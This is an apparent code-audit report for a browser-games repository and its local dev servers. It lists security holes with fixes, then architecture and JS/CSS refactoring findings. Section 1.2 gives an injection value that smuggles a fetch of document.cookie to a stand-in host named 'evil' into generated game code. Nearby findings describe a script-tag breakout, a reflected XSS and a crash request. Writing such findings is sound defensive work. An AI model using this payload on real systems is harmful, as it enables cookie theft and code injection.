# Audit — security, architecture, factorization

Findings of the code audit run on 2026-09-21 over `packages/`, `games/`,
`tools/`, `site/` and `lab/`, with the fix proposed for each. It is the
write-up the [TODO.md](../TODO.md) *codebase* task asked for: what is a hole,
what is dead, what moves — written down BEFORE anything is fixed, so the fixes
land as separate, reviewable changes. A finding is **removed** from this file
once its fix has landed; the recommended order is at the end.

Every finding was verified against the sources at the time of writing. A
`file:line` is where to look; line numbers drift, the symbol beside them does
not.

## 1. Security

The real attack surface is small: there is no server in production (Vercel
serves static files, itch serves one HTML file), no third-party dependency
(no `package.json`, no `node_modules`), and no external URL in the games or
the site beyond the store links. What is exposed is the **lab servers
while they run** — and what they are allowed to write into the repo.

### 1.1 The site loop binds every interface — MEDIUM

The four lab tools and `make lab` now run on `tools/lib/serve.mjs`, which
binds `127.0.0.1` and refuses any request whose `Host` is not this machine.
`tools/lab/serve-site.mjs:158` is the one left: `listen(PORT)` with no host
binds `::`, reachable from the whole LAN. It writes nothing, so what it
exposes is the built site, not the repo.

**Fix.** Put it on `tools/lib/serve.mjs` (`listen`, `guard`), like the others.

### 1.2 `apply-events.mjs` splices request values into `game.js` unvalidated — HIGH

`tools/lab/apply-events.mjs:71` — `const text = spec.str ? q(value) : String(value)`. For `vol` / `rate` the **existing** argument is checked to be
numeric (`:77`) but the **incoming** value is written verbatim, so
`{"set":{"vol":"0.8); fetch('//evil/'+document.cookie); (1"}}` lands as real
code in the game, which the watcher rebuilds and serves.

`q()` (`:51`) escapes `\` and `"` only. A word containing `</script>` is
written unescaped into `game.js`, and the single-file build inlines it inside
`<script>` — the HTML parser closes the script there. `apply-text.mjs:50` has
the same gap (`JSON.stringify` does not escape `/`), and `apply-text.mjs:49`
writes `#intro-tagline` into `page.html` as raw HTML by design
(`scan-text.mjs:419`), unfiltered.

**Fix.** Numeric fields require `/^-?\d+(\.\d+)?$/` on the incoming value;
`q()` / `encode()` also escape `<` as `\x3c` and `\n` `\r` ` ` ` `;
the tagline accepts `<b class="w-…">` and text nodes only.

### 1.3 One malformed request kills every dev server — MEDIUM

`decodeURIComponent(url.pathname)` sits outside the `try` in
`serve-site.mjs:127` (the lab tools decode inside `guard()` of
`tools/lib/serve.mjs` and answer 400). `GET /%` throws `URIError`,
the rejection is unhandled, the process exits. An `<img src="http://localhost:8090/%">` in any page stops the dev loop.

**Fix.** Wrap the decode; answer `400`.

### 1.4 Reflected XSS in the site loop's 404 — LOW

`serve-site.mjs:156` echoes the decoded path into `text/html` unescaped. The
lab tools answer in `text/plain` since they moved onto `tools/lib/serve.mjs`,
so it no longer shares an origin with a write route.

**Fix.** `text/plain`, through `notFound()`.

### 1.5 `vercel.json` has no CSP and no `frame-ancestors` — MEDIUM

`vercel.json:12-21` sets `nosniff`, `Referrer-Policy` and
`Permissions-Policy` only. The site and every `/games/<slug>/` can be framed by
any origin.

**Fix.** Add
`Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src 'self' data:; font-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-ancestors 'self'`
— the inline allowances are needed by the built pages. HSTS is Vercel's
(assumption: injected on production domains, not verified here).

### 1.6 Low

- **Store composer accepts any bytes.** `serve-store.mjs:259-281` scrubs the
  name (no traversal) but writes unchecked base64 up to 64 MB as `.jpg`.
  Check the JPEG magic bytes, cap at ~5 MB.
- **Village drafts stored raw.** `serve-village.mjs:224` writes the request
  JSON into `lab/village-presets.json` as is; the manifest path
  (`cleanVillage`, `:230-375`) whitelists every field and is fine. Run the
  draft through the same cleaner.
- **Keystore password in clear on disk.** `tools/publish/gen-native.mjs:454-458`
  writes `storePassword` / `keyPassword` into
  `native/<slug>/android/keystore.properties`. `native/` is ignored and nothing
  under it is tracked, but any tool that syncs the tree ships it. Pass the
  values as `ORG_GRADLE_PROJECT_*` env from the Makefile, or `chmod 600`.
- **Prefix check without separator.** `serve-site.mjs:143` tests
  `file.startsWith(OUT)` without `path.sep`; the lab tools go through
  `inside()` of `tools/lib/serve.mjs`. Not exploitable today (no sibling
  `dist/site*`), fix for consistency.

### 1.7 Checked and clean

- `tools/lab/chrome.mjs` `sweep` / `reap`: a process is a candidate only if
  headless AND a Chrome binary AND `--user-data-dir` under the caller's prefix
  AND `ppid === 1`; the disk pass removes fingerprinted profile dirs only. It
  cannot reach a user's real browser.
- Child processes: `execFile` / `spawnSync` with argument arrays everywhere;
  ffmpeg's input is `path.basename` of an existing file in `assets/audio/sfx/`,
  its length clamped; `node build.mjs --game=<slug>` only after the slug is
  validated against the games list.
- `deploy-itch.mjs`: the butler key is env or `butler login`, never read,
  logged or passed as an argument.
- Git hygiene: `.vscode/`, `dist/`, `native/`, `signing.properties`,
  `*.keystore`, `*.jks` ignored; nothing tracked under `dist/` or `native/`;
  no secret in the 1 698 tracked files.
- Runtime: `?lang=` regex + dictionary lookup, `?perf=` exact match, `&off=`
  `[a-z,]` used as object keys, `?force=` `[01]` and localhost-only;
  `site/analytics.js:73` checks `e.origin`; the 53 `innerHTML` sites are fed
  by manifest copy, shell strings, icons and numbers, the site escapes name,
  tags and tagline; `Store` wraps `JSON.parse`, `prog:` / `meta:` are
  schema-checked on read; `openStore()` reads `CONFIG.storeUrl` and nothing
  else.

## 2. Architecture

The foundation is sound: one motor in `packages/`, sources and artifacts kept
apart with a byte-for-byte `--check`, three platform adapters behind one `Ad`
interface, a view system that absorbed six divergent answers. What follows is
where it rubs.

### 2.1 The webshell talks through eleven `window.__X__` globals

`meta.js` reads `window.__LEVELS__` eight times at call time, `levels.js`
reads `__META__`, `village.js` pulls `__MENU__`, `__LEVELS__`, `__META__` and
`__DAILY__` (`village.js:79-83`). `meta.js` also routes itself around
`view.js`: `goTo` (`meta.js:~890`) calls `__ALBUM__.openShop()` /
`__ALBUM__.open()` / `__LEVELS__.open()` by name and `VW.go` for the rest. The
load order those globals depend on exists only in `tools/build/build.mjs:825-831`.

**Fix.** Every module registers its screens with `VW.define("shop" | "sticker" | "map", spec)` so `VW.go(name)` is the one door, and receives what it needs
at `mount` — the way `menu.js` already hands `el` and the language over. No
module reads another's global at call time.

### 2.2 The ES5 constraint is enforced by nothing

No `package.json`, no lint, no check in `tools/update.mjs`. It holds today —
zero arrow functions, zero `let` / `const`, zero template literals in `games/`
and `packages/` — by discipline alone.

**Fix.** A `tools/build/check-es5.mjs` run by `update.mjs`: strip comments and
strings, then refuse `=>`, `` ` ``, `\blet\b`, `\bconst\b`, `class ` in
`games/*/game.js`, `packages/**/*.js`. Thirty lines, no parser.

### 2.3 The manifest is not validated

The one check is `m.slug === folder` (`tools/build/build.mjs:149`). A
malformed `web.levels`, a `copy.fr.strings` entry that is not a string, a
`targets` value that is not a list — all surface at runtime.

**Fix.** `tools/lib/manifest.mjs` with a minimal shape check (types of the
top-level keys, `version` semver, `targets ⊂ {playable, web, android}`,
`web.levels` ranges numeric and ordered), called by `update.mjs`.

### 2.4 Nearly half the shipped bytes are comments

Measured on `games/vipera/index.html`:

| region     |    bytes | comments | share |
| ---------- | -------: | -------: | ----: |
| `<script>` | 1 218 KB |   589 KB |  48 % |
| `<style>`  |    78 KB |    33 KB |  42 % |

`tools/build/build.mjs` has no strip step: `assemble` and `webDress`
concatenate raw sources. The webshell CSS is 50 % comments.

**Fix.** A comment strip (not a minifier: no renaming, no reflow) applied in
`assemble` and `sharedFiles`, careful with `/*` inside strings and `//` inside
URLs. Saves ~600 KB per playable and ~115 KB of CSS per itch build, and makes
the 5 MB gate honest. Sources keep their comments. All thirteen `index.html`
regenerate once.

### 2.5 Documentation drift

- `docs/ARCHITECTURE.md:61` and `docs/ENGINE.md:1287` describe a
  `build.mjs --fix` that does not exist.
- `CLAUDE.md` is ~15 000 words and narrates the history of decisions rather
  than the rules. The narrative belongs in `docs/` (much of it is already
  there); `CLAUDE.md` should go back to being an index of rules with links.
  `TODO.md` has the same tendency (the village task alone is a page).

### 2.6 Dead motor code kept alive

`Overlay.toast/banner/reward` (`packages/shell/shell.js:206-248`) and their
CSS (`packages/shell/motor.css:131-172`, ~42 lines, plus the toast column
moved by `games/bouncetry/skin.css:27-30` and `games/echomaze/skin.css:29-32`)
have no caller in any game, in the webshell or in the template — only
`tools/lab/bench-pop.mjs:185,210`. `CLAUDE.md` already bans new use.

**Fix.** Delete both ends and the two skin rules; drop the bench rows.

### 2.7 Three formulas for "which band is level n in"

`blight` `floor((level-1)/6)` (`game.js:1256`), `echomaze` `floor(d*5)`
(`:1893`), `arcider` / `radiam` / `spinshock` a `biomeFrom[]` threshold table
(`arcider:991`, `radiam:2883`, `spinshock:2506`) — against
`packages/webshell/levels.js:249` `bandOf(n) = floor(dOf(n)*5)` with `dOf` a
power curve. A level near a boundary can be band k on the map and k±1 in the
round. `Music.play(CONFIG.level ? BAND.music : null)` is repeated in five
games too.

**Fix.** `levels.js` writes `CONFIG.band` beside `CONFIG.level`; the games
drop their own `bandFor`.

### 2.8 One test, well built, alone

`tools/test/views.mjs` asserts the view contract in a real build. The engine
— `Layout`, `upper`, `Store`, `Beat`, `Rand` — is pure JS with no test, and it
runs under Node in three lines of `vm`.

**Fix.** `tools/test/engine.mjs` evaluating `packages/engine/engine.js` in a
`vm` context with a stub `document`, asserting `upper` (accents, glued
units), `Layout` (safePad floor, insets), `Store` fallback, `Beat` phase.

## 3. Factorization — JavaScript

Ranked by gain. Line counts are estimates.

### 3.1 Headless Chrome launched eleven times (~750 lines)

`tools/lab/chrome.mjs` exports `sweep` / `reap` / `reportSweep` only. Every
consumer re-implements the rest: the `CHROME` path constant (11×),
`launchChrome(profileDir)` (11×), a CDP client `cdp(port)` + `send()` (11×),
`openPage` (8×), `evaluate` (7×), `sleep` (9×) — `bench-audio`, `bench-pop`,
`bench-raster`, `cut-objects`, `encode-art`, `shoot-cover`, `shoot-gears`,
`shoot-icon`, `shoot-screens`, `shoot-store`, `test/views`. `shoot-icon:78-150`
and `shoot-store:254-326` differ by one flag and one `Emulation.*` call.
`CLAUDE.md` says "imports chrome.mjs, and there is no second way": the launch
itself is the second way, eleven times.

**Fix.** `chrome.mjs` grows `launch({ prefix, size, args })`,
`connect(port)`, `openPage(client, { width, height, transparent })`,
`evaluate(client, sid, expr)`, `sleep`. Each script keeps ~5 lines.

### 3.2 The end screen's three clips embedded in ten games (~22 KB × 11)

`uiScore`, `uiStar`, `uiRow` are byte-identical (same md5) in `arcider`,
`blight`, `chainring`, `gearball`, `orbinity`, `radiam`, `slipdeck`,
`spinshock`, `triverse`, `vipera` and `template/game.js`. Their only caller is
the motor (`packages/shell/shell.js:1350,1367,1383`, `Sound.cue`). `bouncetry`,
`echomaze` and `marshmelt` do not carry them, so their end screen falls back to
the synth beep: **three games out of thirteen sound different on the one
screen that is the same for all.** In the split site build the clips ship ten
times instead of once.

**Fix.** A shell-owned sound sheet injected by `build.mjs` the way
`CONFIG.shellArt` is (`assets/audio/shell/`, `CONFIG.shellSounds`), removed
from every `ASSETS.sounds`. In the split build it lands in the shared
`engine.<hash>.js` and is cached once.

### 3.3 `tools/`: repo boilerplate re-typed per script (~150–200 lines, 30 files)

- `ROOT` defined 22 times in five spellings.
- The games list: 12 copies, **four behaviours** — filter on `manifest.json`
  (`update`, `deploy-itch`, `store-meta`, `encode-art`, `shoot-*`,
  `cut-objects`), on `page.html` (`build.mjs:126`), no filter (`scan-text`,
  `scan-events`, `gen-catalogues`, `extract`).
- `manifestOf`: 6 copies, three contracts (throws / returns null / unchecked);
  only `build.mjs:146` checks `m.slug === folder`.
- `targets.includes(t)` ×3, `camel(role)` ×2 identical (`build.mjs:393`,
  `serve-village.mjs:129`), `bumpPatch` / `splice` living in a TOOL
  (`apply-events.mjs:313`) and imported by `apply-text` and `serve-village`.

**Fix.** `tools/lib/repo.mjs` → `ROOT`, `GAMES_DIR`, `games()`,
`manifestOf(slug)`, `hasTarget(m, t)`, `camel()`, `bumpPatch()`, on the model
of `tools/lib/parts.mjs`. Ties in with 2.3.

### 3.4 `serve-site.mjs`: the one server left off `tools/lib/serve.mjs`

The four lab tools share `tools/lib/serve.mjs` — `MIME`, `json`, `readJson`,
`sendFile`, `reloadHub`, `guard`, `listen` — and `make lab` proxies them.
`serve-site.mjs` still carries its own MIME table, SSE channel, static
fall-through and `listen`.

**Fix.** Move it onto the module; that is also where 1.1, 1.3 and 1.4 close.

### 3.5 Lab palettes hand-copied and already wrong (~110 lines + drift)

`lab/game-title.html:178-244` THEMES, `lab/level-map.html:502-542` GAMES,
`lab/store-card.html:373-387` FALLBACK_GAMES, `lab/cover-card.html:278-295`.
Measured drift: store-card gives `blight` `#ff8fab` where its skin says
`--accent:#3aa0ff`; `bouncetry` `#ff3b57` vs skin `#4bf5ff`.

**Fix.** `tools/build/gen-catalogues.mjs` also writes `lab/_catalogue.js`
(slug, title, `web.font`, skin `:root` tokens parsed from `skin.css`,
`web.levels` ranges); the lab pages load it by relative path, which they are
allowed to.

### 3.6 `upper()` — seven copies, four variants

`packages/engine/engine.js:820-864` (reference, 44 lines); `lab/brick.html:126`
= `lab/overlay-pop.html:950`; `lab/gearball-loop.html:754` =
`lab/slipdeck.html:487`; `lab/village.html:1076` (third variant);
`site/script.js:64-71` — plain `toUpperCase` + accent fold, **without** the
glued-unit rule, so `"x" + 3` shouts differently on the site.

**Fix.** `lab/_upper.js` loaded by `<script src>`; the site inlines the engine
version verbatim (a comment says where it came from).

### 3.7 Games: sprite caches ignore `view.dpr` in nine of thirteen (~40 lines + a rule broken)

Nineteen `createElement("canvas")` sites; only `blight`, `marshmelt`,
`orbinity`, `spinshock` scale by `view.dpr`. `arcider`, `bouncetry`,
`echomaze`, `gearball`, `radiam` (5 canvases), `slipdeck`, `triverse`,
`vipera` size at design px — blurry at dpr 2, against `CLAUDE.md` ("size every
cached canvas with it"). Four local `makeCanvas` (`marshmelt:215` ≡
`spinshock:496`).

**Fix.** `engine.js` `Sprite.canvas(w, h)` → `{ cvs, ctx }` pre-scaled by
`view.dpr`, beside `pixelRatio`; the games call it.

### 3.8 Games: the round's ending assembled thirteen times (~60 lines)

The star ladder `score >= A ? 3 : score >= B ? 2 : score > 0 ? 1 : 0` in nine
games; `variant: st===3 ? "perfect" : st===2 ? "win" : ""` eleven times;
`best = Store.get("bestScore", 0)` in `reset()` and a `{ label: "Best score", grade: "gold" }` row in ten games — while `shell.js:1744-1745` already
computes and stores `best` on `endRound`.

**Fix.** `CONFIG.stars = [B, A]` read by `endRound` when `result.stars` is
absent (variant derived from it); the shell appends the Best-score row itself
(`rows` cap of four kept; `CONFIG.bestRow = false` opts out).

### 3.9 Games: small helpers, many copies (~125 lines)

- Hex colour mixing: 7 copies, 4 algorithms (`arcider:1164` AND
  `arcider:3803`, `spinshock:707`, `echomaze:502`, `orbinity:295`,
  `radiam:561`, `radiam:758`). → `mix(a, b, t)`, `shade(hex, k)` beside `rgba`.
- Rounded rect: 4 copies (`bouncetry:271` ≡ `echomaze:491`, `arcider:3022`,
  `slipdeck:652`). → `Draw.roundRect`.
- `TAU` in 8 games, `ease` (`vipera:286` ≡ `triverse:239`), `lerp`,
  `wrapAngle` ×2, `dist`. → beside `clamp` (`engine.js:7`).
- Cover-fit background cache: `bouncetry:314` ≡ `echomaze:542`,
  `gearball:737`. → `Art.coverCanvas(img)` or `CONFIG.sceneArt`.

### 3.10 Webshell: DOM, format and language helpers per module (~70 lines + 209 of tables)

`$()` ×7, `el()` ×4 full copies (`menu:374`, `meta:692`, `view:64`,
`village:90`), `frame()` ×4, `num()` `levels:153` ≡ `meta:167`, three
number tweens with three easings (`shell:1278`, `meta:2260`, `levels:735`).
Five modules each carry `STRINGS / LANG / T / setLang` and `menu.js:1046` fans
`setLang` out to four of them by hand.

**Fix.** `view.js` — already the hub — exports `el / $ / num / icon / art` once
and a single `onLang(fn)` broadcast; one `tween(from, to, ms, ease, cb)`.

### 3.11 Well factored, leave alone

Games reach the motor and not copies of it: `Fx.*` 285 calls, `Pop.show` 105,
`Sound.clip` 185, `Rand.*` 297; zero `AudioContext`, zero DOM creation, zero
`setTimeout`, zero own shake / flash / particle list, zero `toUpperCase`.
The webshell touches the motor only through `window.__WEB__`. `parts.mjs` is
shared by build and extract; `scan-text` builds on `scan-events`' parser;
`bumpPatch` is imported, not copied. `Sound.cue`'s fallback contract is
honoured (`slipdeck` alone leans on it, by design).

## 4. Factorization — CSS

Inventory: `motor.css` 1 139 lines · webshell 3 693 (`meta` 1 842, `levels`
600, `menu` 572, `village` 424, `view` 255) · `frame.css` 75 · `site/style.css`
1 150 · 13 skins 2 669 (`echomaze` 411 … `chainring` 120) · 15 lab pages with
83–847 lines of inline CSS each.

### 4.1 The motor bakes the DEFAULT accent into its glows — every skin re-overrides by hand

`motor.css` hard-codes `rgba(0,229,255,…)` — the default `--accent` — in 8
places (`#hud-score:101`, `.btn:682`, `#app-icon:793`, `#intro-title:798`,
`.demo-target:888`, `perfectglow:1030`, `.eo-score:1038`,
`.eo-row.accent:1104`) and `rgba(255,45,85,…)` (default `--danger`) twice.
The token changes, the glow does not, so the skins redeclare:

| rule                                       | skins |
| ------------------------------------------ | ----: |
| `.btn { box-shadow }`                      | 12/13 |
| `#hud-score { text-shadow }`               | 12/13 |
| `#app-icon { box-shadow }`                 |  9/13 |
| `.eo-score { text-shadow }`                |  5/13 |
| `#cta-bar { border-top }` (motor has none) | 13/13 |
| `.w-* { text-shadow: 0 0 18px rgba(...) }` | 10/13 |

The same in the webshell: `rgba(255,212,59,…)` (default `--gold`) 62 times
(`meta` 37, `levels` 13), `#ffd43b` 5 times — `marshmelt` overrides `--gold`,
so all 62 glows are off-palette there.

**Fix.** Tokens `--accent-rgb: 0,229,255`, `--danger-rgb`, `--gold-rgb` in the
motor `:root`, consumed as `rgba(var(--accent-rgb), .55)`; `#cta-bar` gets its
`border-top` in the motor; `.w-*` shadows use `currentColor` as `motor.css:824`
already does for `b`. Skins keep the tokens only. (Prefer rgb triplets over
`color-mix()`: playables target old WebViews.) ~90 skin lines gone, and a
coupling every new game copies.

### 4.2 The intro stage's defaults are wrong for every game

`.demo-stage` is 380×210 in the motor (`:876`); **13/13 skins** set
`width:420px` and a height of 250–324. `.demo-caption { display:none }` in
10/13 skins although `motor.css:882` `.demo-caption:empty { display:none }`
already hides it and all thirteen set `caption: ""`. `#intro-tagline`
font-size / weight / colour re-set in 13/13 within a narrow band.

**Fix.** Motor defaults `width:420px; height:var(--demo-h, 280px)`; delete the
ten caption rules; tagline defaults to the median (`34px / 800 / var(--text)`)
with skins overriding the outliers. ~35 lines, 13 files.

### 4.3 The `.pop-sub` palette triple instead of tokens

`.pop-X .pop-sub { background; border-color; color }` is written 6× in the
motor (`:549, :604, :611, :624, :631, :654`) and 13× in skins, while Pop
already exposes `--ink / --fill / --glow / --chip / --chip-line`.

**Fix.** `.pop-sub { background:var(--sub-bg, var(--ink)); border-color:var(--sub-line, …); color:var(--sub-fg, #fff) }`
once; styles and skins set the three tokens beside `--fill`.

### 4.4 Webshell: keyframe families defined three to five times

- scale-in, byte-identical ×3: `mt-in` `meta:156`, `lv-in` `levels:46`,
  `vg-in` `village:32`; plus translate-in variants (`web-rank-in`,
  `mt-say-in`, `al-tag-in`, `mt-pop` ≈ `mt-mult-in`).
- bump ×5: `mt-pulse`, `lv-pulse`, `vg-pulse`, `mt-hit`, `lv-hud-hit` (motor
  `scorebump`, `eopop` are the same shape).
- float ×5: motor `iconfloat`, `titlefloat`, `decor-bob`; `mt-g-float`,
  `vg-float`, `dl-bob`.
- sweep ×5: motor `shine`, `al-shine`, `mt-sweep`, `lv-sheen`, `mt-shine` —
  **three of them animate `left`**, against the motor's own rule
  (`motor.css:369-381`: a decor animates transform and opacity only).
- view root ×3: `#lv-screen`, `#al-screen, #sh-screen`, `#web-rank` — same
  `position:absolute; inset:0; display:none; font-family; color` + `.on`.
  `view.js:144-147` stamps `wm-modal` / `wm-card` on modals but no class on
  views.
- three `prefers-reduced-motion` blocks (`meta:1817`, `levels:595`,
  `village:419`).

**Fix.** In `view.css`: `@keyframes wm-in`, `wm-bump` (with `--amp`),
`wm-float` (with `--amp`, as `decor-bob` already does), `wm-sheen`
(transform-based); a `.wm-view` base class stamped by `View.mount`; one
reduced-motion block. Durations stay at the call site. ~60 lines.

### 4.5 Webshell: one "dark pill" written ~17 times, one gradient CTA three times

`background:rgba(0,0,0,.4–.5); border:2px solid var(--panel-line)` + radius +
web font + uppercase: `view.css:131, :218`, `menu.css:292, :310, :322, :348, :381, :412, :449`, `levels.css:123, :422, :501`, `meta.css:65, :235, :344, :467, :513, :532, :1621`. The gradient CTA is identical three times
(`#lv-play` `levels:451-457`, `.al-draw` `meta:409-417`, `.mt-btn.gold`
`meta:538-542`) down to the `:active` press. `font-family:var(--web-font)` is
repeated 29× and `var(--web-fw)` 41× because nothing sets the family once on
`#frame` in the web build.

**Fix.** `view.css` components `.wm-pill`, `.wm-cta` (+ `:active:not(:disabled)`);
`#frame { font-family:var(--web-font, inherit) }` once, in the web build only.
Caveat: `dress()` rewrites the end-screen buttons' `className`
(`menu.css:441-456`), so the shared class is added by that JS, not by markup.
~90–120 lines.

### 4.6 Skins: one colour typed dozens of times

`bouncetry` `rgba(255,59,87` ×36 and `rgba(47,134,255` ×23, its five-stop
gradient copied 8× verbatim (`:83-185`); `echomaze` declares `--arc:#7ef9ff`
and retypes it as rgba 21×; `radiam` `rgba(10,6,26` ×18; `gearball`
`rgba(143,166,216` ×17; `triverse` `#ffffff` ×18.

**Fix.** Two or three skin-local tokens per game, referenced. `bouncetry`
~60 lines. The rest of `echomaze`'s and `bouncetry`'s length is a demo
**simulation emitted as CSS** (a 34-layer maze, 15–20-stop keyframes) — data,
not duplication; leave it.

### 4.7 Lab: the template's panel copied into five pages

`cover-card`, `level-map`, `eclipse-fog`, `village`, `store-card`,
`game-events` carry 10–22 of `_template.html`'s 37 panel declarations
verbatim; the palette `#12121c / #0b0b12 / #2c2c47 / #8b8ba7` recurs 5–12× per
page; no page `<link>`s a stylesheet.

**Fix.** `lab/_lab.css` (body, `#panel`, `.row`, `button`, `#stage`, tokens)
linked by every page — the lab may load by relative path. ~150 lines.

### 4.8 Checked and clean

No skin redeclares a motor rule wholesale; `!important` is 0 in the skins and
3 in the webshell, all justified; `#intro-title` in 13/13 skins is the
logotype and belongs there; Pop overrides are token-only as designed; every
motor token a skin sets is read; no dead motor rule except the toast column
(2.6); the z-index ladder is coherent; each stylesheet ships once per build;
`frame.css` is token-driven; the site and the motor share idioms but not a
palette — not worth sharing.

## 5. Recommended order

1. **Security, half a day, no design risk.** 1.2 value validation and
   `\x3c` escaping, 1.5 CSP, and `serve-site.mjs` onto `tools/lib/serve.mjs`
   (3.4), which closes what is left of 1.1, 1.3 and 1.4.
1. **Three zero-risk byte wins.** 2.4 comment strip in the build; 3.3
   `tools/lib/repo.mjs` + 3.1 `chrome.mjs` growing the launch; 3.2 the end
   screen's clips into the shell.
1. **One motor + skins pass, one commit, thirteen patch bumps.** 4.1
   `--*-rgb` tokens, 4.2 stage defaults, 4.3 `.pop-sub` tokens, 2.6 dead
   `Overlay` code — they touch the same skin regions.
1. **The engine gains its helpers.** 3.7 `Sprite.canvas` (fixes a rule
   broken in nine games), 3.8 `CONFIG.stars` + Best-score row, 3.9 math and
   colour helpers, 2.7 `CONFIG.band`; each game moves its version as it is
   touched.
1. **The webshell tidies itself.** 4.4 + 4.5 `view.css` components and
   keyframes, 3.10 helpers out of `view.js`, then 2.1 registration through
   `VW.define` — the most structural change and the least urgent.
1. **Tooling and docs.** 2.2 ES5 check, 2.3 manifest validation, 2.8 engine
   tests, 3.5 generated lab catalogue, 3.6 one `upper`, 4.7 `_lab.css`, 2.5
   doc drift.
